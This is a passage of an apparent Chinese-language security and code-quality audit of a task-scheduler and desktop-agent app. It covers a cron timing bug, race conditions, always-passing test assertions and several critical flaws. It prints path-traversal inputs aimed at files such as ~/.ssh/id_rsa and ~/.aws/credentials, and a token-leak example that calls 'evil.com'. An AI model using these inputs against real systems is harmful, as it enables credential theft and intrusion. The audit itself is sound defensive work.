### 1.2 二轮的三条新根因

#### 根因 ⑥ —— **时间锚点错误：正向遍历「从创建时刻到现在」**

`scheduler_service.py:490` / `:523` / `:928` 三处都用「从 `created_at` 起迭代 N 次取最后一个」来求「最近一次触发时刻」：

```python
for _ in range(200):        # ← 固定上限，与任务年龄无关
    nxt = trigger.get_next_fire_time(None, cursor)
    cursor = nxt
last = cursor
```

**运行时验证**（2 天前创建的 `*/5` 任务）：

```
_cron_last_fire() 返回 : 2026-10-29 09:20:00+00:00   ← 第 200 次迭代的截断值
真实最近一次触发时刻   : 2026-10-31 09:15:00+00:00
偏差                   : 47.9 小时
```

后果链：`scheduled_for` 被钉死在 47.9 小时前 → `uq_runs_task_slot(task_id, scheduled_for)` 冲突 → `create_run()` 返回 `None` → `scheduler_service.py:595` 判定「槽位已执行过，跳过」→ **此后每次触发都用同一个陈旧槽位 → 任务永久停摆，且日志只打 INFO 无告警**。

**停摆阈值**：`*/*1` ≈ 3.3 小时 ｜ `*/5` ≈ 16.7 小时 ｜ 每小时 ≈ 8.3 天 ｜ 每天 ≈ 200 天。
**这是二轮最严重的发现**：定时任务在**用户毫无察觉**的情况下逐个失效。

#### 根因 ⑦ —— **资源配对与生命周期校验缺失**

| 现象 | 位置 |
| --- | --- |
| 调度租约 check-then-act（读→判→写） | `scheduler_service.py:138` |
| `init_app_state()` check-then-set | `core/state.py:32` |
| `get_engine()` 惰性初始化 check-then-act | `db/base.py:69` |
| `start()` 可重入 → 重复 spawn sidecar | `desktop/src/main/backend.ts:85` |
| `pruneRuntime` 引用作用域外变量 | `scripts/stage-runtime.mjs:291` |
| `append_message` 只捕获 `IntegrityError`，漏掉 SQLite 锁错误 | `session_service.py:254` |

**共同形态**：读—判断—写之间没有原子性保证（无 `INSERT ... ON CONFLICT`、无 `UPDATE ... WHERE` 条件、无锁、无双重检查）。

#### 根因 ⑧ —— **「校验」用了取巧写法，使校验永远通过**

这是二轮最容易被忽略、但影响面最广的一类：

| 写法 | 位置 | 后果 |
| --- | --- | --- |
| `missing = [f for f in REQUIRED if not getattr(payload, f, None)]` | `delivery.py:97` | **`duration_ms=0` 被判为「缺失」→ 所有通知被拒** |
| `assert ... or True`（8 处） | `backend/tests/` | 断言恒真 |
| `assert set(TRANSPORTS if False else (...)) == {...}` | `test_s7_automation.py:184` | 测的是字面量，不是被测常量 |
| `assert out.get("success") is False or out.get("error") == ""` | `tests/native/test_native.py:47` | **越界写入被放行时测试仍然绿** |
| `if not baseline.exists(): ... skip` + `assert size > 0` | `tests/visual/test_visual.py:59` | 视觉基线从未比对 |

**元结论**：这些断言的共同点是——**它们在「被测行为正确」和「被测行为错误」两种情况下都通过**。这解释了为什么 626 个绿色用例与 82 个二轮缺陷（以及一轮的 189 个）能够长期共存。

### 1.3 一句话结论

> **一轮证明了「主干链路在 SSE 生产路径上不生效」；二轮证明了「另外四个区域（桌面壳 / 部署资产 / 运维脚本 / 测试套件）存在同等级别的问题」。**
>
> 二轮最有价值的三个具体发现：
> - **定时任务会在运行 3~200 天后静默永久停摆**（根因 ⑥，运行时验证）；
> - **SPA 回退路由可读取服务器上任意文件**（`main.py:273-283`，运行时验证逃逸成功）；
> - **所有定时任务的通知推送 100% 失败**（`delivery.py:97`，运行时验证）。
>
> 而**根因 ⑧（取巧断言）**说明：当前「626 passed / 0 failed」的绿色基线**不构成任何质量保证**。测试体系的修复（W11）必须与功能修复同步，否则下一轮复审会重复同样的发现。

## 二、二轮严重缺陷（`AUD2-C`，8 条）

### AUD2-C01 · SPA 回退路由路径穿越 —— 可读取服务器任意本地文件

- **位置**：`backend/app/main.py:273-283`
- **证据**：
  ```python
  @app.get("/{full_path:path}", include_in_schema=False)
  def spa_fallback(full_path: str) -> FileResponse:
      if full_path.startswith("api/"):
          raise HTTPException(status_code=404, ...)
      target = FRONTEND_DIST / full_path
      if full_path and target.is_file():        # ← 无 resolve() / is_relative_to
          return FileResponse(target)
      return FileResponse(FRONTEND_DIST / "index.html")
  ```
- **运行时验证**（`/tmp/probe_root/frontend/dist` 为 dist 根）：
  ```
  full_path='../secret.txt'          → target.is_file()=False
  full_path='../../secret.txt'       → target.is_file()=True   ← 逃逸成功!
  ```
  `Path.is_file()` 会跟随 `..` 解析；`full_path` 来自路径参数，`%2e%2e%2f` 被 uvicorn 解码即成为 `../`。
- **影响**：
  1. 可读取 `~/.ssh/id_rsa`、`~/.aws/credentials`、`backend/.env`（含**明文 API Key**）等任意文件；
  2. 该路由**不经过 `/api/v1/` 前缀判断**，因此**不触发 `desktop_guard` 中间件的 Host 白名单与会话校验**（见 `AUD2-H15`）→ 在桌面态可**无凭据**读取；
  3. 一轮审计读 `main.py` 时**漏掉了这条**——它是 `@app.get` 装饰器下的普通函数，且 `include_in_schema=False` 使其不出现在 OpenAPI 中，人工核对端点表时极易跳过。
- **文档冲突**：`design/04` 的「本地数据与安全边界」把文件访问边界建立在**权限引擎**上；而此路由**完全绕过**权限引擎。

### AUD2-C02 · 桌面会话令牌随任意 URL 外发到外部主机

- **位置**：`frontend/desktop/src/main/ipc.ts:171-173`
- **证据**：
  ```ts
  const target = new URL(url, base);
  ... http.get(target, { headers: { "X-Agent-Desktop-Token": handle.token } })
  ```
  `url` 完全由渲染进程提供；`new URL(url, base)` 在 `url` 是绝对地址时**忽略 base**。
- **影响**：若 `url = "http://evil.com/x"`，请求会**带着常驻桌面令牌**发往外部站点。该令牌可直接通过后端 `request_authorized()` → 等于把整个 `/api/v1/**` 的权限外送。结合 `AUD2-M11`（无 CSP），渲染层一处 XSS 即可完成提权。
- **修复**：`if (target.origin !== \`http://127.0.0.1:${handle.port}\`) return fail("E_INVALID", ...)`

### AUD2-C03 · 定时任务在运行一段时间后**永久静默停摆**

- **位置**：`backend/app/services/scheduler_service.py:490`（cron）、`:523`（RRULE）、`:928`（补跑）
- **运行时验证**：见 §1.2 根因 ⑥（47.9 小时偏差）。
- **影响**：
  - 任务**不再执行**，但 `scheduled_tasks.last_status` 仍显示上一次的成功状态 → 运维看板**完全看不出异常**；
  - `runs` 表不再新增行 → 运行历史看起来「一切正常，只是没动静」；
  - 用户视角：**「定时任务好像不跑了」**，且没有任何错误日志。
- **文档冲突**：`design/01` 的 `F-SCH-01`（RRULE 槽位）标 ✅ 并注明「槽位取 RRULE 展开出的合法触发点（幂等闸门 `uq_runs_task_slot` 有效）」——**闸门本身在长任务上失效**。

### AUD2-C04 · 调度租约 check-then-act 竞态 —— 多副本可同时成为 primary

- **位置**：`backend/app/services/scheduler_service.py:138`
- **证据**：
  ```python
  row = db.get(SystemLockRow, LEASE_NAME)
  if row is None:
      db.add(SystemLockRow(name=LEASE_NAME, owner=self.owner, ...))
  ```
  读与写之间无锁、无条件更新、未捕获并发插入的 `IntegrityError`。
- **影响**：两个副本同时启动 → 都读到 `None` → 都 `add` → 其一提交时抛未捕获的 `IntegrityError`（直接冒泡出 `start()`，**整个调度器启动失败**），或两者都判定自己拿到租约 → **双 primary 双调度**，同一任务被触发两次。
- **文档冲突**：`design/01` `F-SCH-09`、以及 `plan/03` 的「租约防多副本重复调度」——该不变式在并发启动下不成立。

### AUD2-C05 · 无鉴权 API 暴露全网卡，且 Agent 可执行 shell 命令

- **位置**：`docker-compose.yml:99-101` + `backend/.env:18` + `backend/app/main.py:79-82`
- **证据**：
  ```
  docker-compose.yml:101   ports: ["${HOST_HTTP_PORT:-8080}:80"]   ← 绑定宿主机全部网卡
  backend/.env:18          HOST=0.0.0.0
  backend/.env              AGENT_API_KEY 未配置 → 鉴权不启用（config 默认 ""）
  ```

- **影响**：`deploy/README.md` 声称「对外入口由 Nginx 反代管控」，但 Nginx **只做透传**。同网段任何人可：

- **与一轮的关系**：一轮 `AUD-C07`（记忆端点任意文件删除）在「无鉴权 + 全网卡」下从「高危」升级为「**可直接利用**」。

## 九、二轮结论

1. **一轮的 189 条全部仍成立**（代码基线 `7385dcd` 未变），二轮**新增 98 条**（+ 14 条设计声明不符），合计 **287 条**。
